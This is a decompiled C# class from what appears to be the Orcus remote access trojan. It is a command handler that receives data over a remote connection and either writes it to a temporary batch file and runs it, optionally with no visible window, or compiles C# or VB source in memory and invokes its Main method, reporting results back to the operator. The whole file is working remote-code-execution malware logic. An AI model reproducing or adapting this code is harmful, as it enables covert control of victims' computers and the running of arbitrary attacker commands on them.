using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using Microsoft.CSharp;
using Microsoft.VisualBasic;
using Orcus.Plugins;
using Orcus.Shared.Commands.Code;
using Orcus.Shared.Utilities;

namespace Orcus.Commands.Code;

internal class CodeCommand : Command
{
	public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
	{
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Invalid comparison between Unknown and I4
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Invalid comparison between Unknown and I4
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00df: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f8: Expected O, but got Unknown
		CodeCommunication val = (CodeCommunication)parameter[0];
		if ((int)val != 0)
		{
			if ((int)val == 1)
			{
				string freeTempFileName = FileExtensions.GetFreeTempFileName("bat");
				bool createNoWindow = parameter[1] == 1;
				Process process = new Process
				{
					StartInfo = 
					{
						UseShellExecute = false,
						FileName = freeTempFileName,
						CreateNoWindow = createNoWindow
					}
				};
				File.WriteAllText(freeTempFileName, Encoding.UTF8.GetString(parameter, 2, parameter.Length - 2));
				process.Start();
				connectionInfo.CommandResponse((Command)(object)this, new byte[1] { 5 }, (PackageCompression)0);
				process.WaitForExit();
				try
				{
					File.Delete(freeTempFileName);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
			if ((int)val != 6)
			{
				throw new ArgumentOutOfRangeException();
			}
		}
		string @string = Encoding.UTF8.GetString(parameter, 1, parameter.Length - 1);
		Dictionary<string, string> dictionary = new Dictionary<string, string> { { "CompilerVersion", "v3.5" } };
		_003F val2 = ((parameter[0] == 0) ? new CSharpCodeProvider((IDictionary<string, string>)dictionary) : new VBCodeProvider((IDictionary<string, string>)dictionary));
		CompilerParameters val3 = new CompilerParameters();
		val3.set_GenerateInMemory(true);
		val3.set_GenerateExecutable(false);
		CompilerParameters val4 = val3;
		val4.get_ReferencedAssemblies().Add("System.dll");
		val4.get_ReferencedAssemblies().Add("System.Core.dll");
		val4.get_ReferencedAssemblies().Add("System.Windows.Forms.dll");
		val4.get_ReferencedAssemblies().Add("System.Xml.dll");
		val4.get_ReferencedAssemblies().Add("System.Xml.Linq.dll");
		CompilerResults val5 = ((CodeDomProvider)val2).CompileAssemblyFromSource(val4, new string[1] { @string });
		if (val5.get_Errors().get_HasErrors())
		{
			List<byte> list = new List<byte> { 2 };
			list.AddRange(BitConverter.GetBytes(((IEnumerable)val5.get_Errors()).OfType<CompilerError>().Count((CompilerError x) => !x.get_IsWarning())));
			CompilerError val6 = ((IEnumerable)val5.get_Errors()).OfType<CompilerError>().First((CompilerError x) => !x.get_IsWarning());
			list.AddRange(BitConverter.GetBytes(val6.get_Line()));
			list.AddRange(Encoding.UTF8.GetBytes(val6.get_ErrorText()));
			connectionInfo.CommandResponse((Command)(object)this, list.ToArray(), (PackageCompression)0);
			return;
		}
		try
		{
			object obj = val5.get_CompiledAssembly().CreateInstance("Orcus.CodeExecution");
			(obj?.GetType().GetMethod("Main"))!.Invoke(obj, null);
			connectionInfo.CommandResponse((Command)(object)this, new byte[1] { 4 }, (PackageCompression)0);
		}
		catch (Exception ex2)
		{
			List<byte> list2 = new List<byte> { 3 };
			list2.AddRange(Encoding.UTF8.GetBytes(ex2.Message));
			connectionInfo.CommandResponse((Command)(object)this, list2.ToArray(), (PackageCompression)0);
		}
	}

	protected override uint GetId()
	{
		return 3u;
	}
}
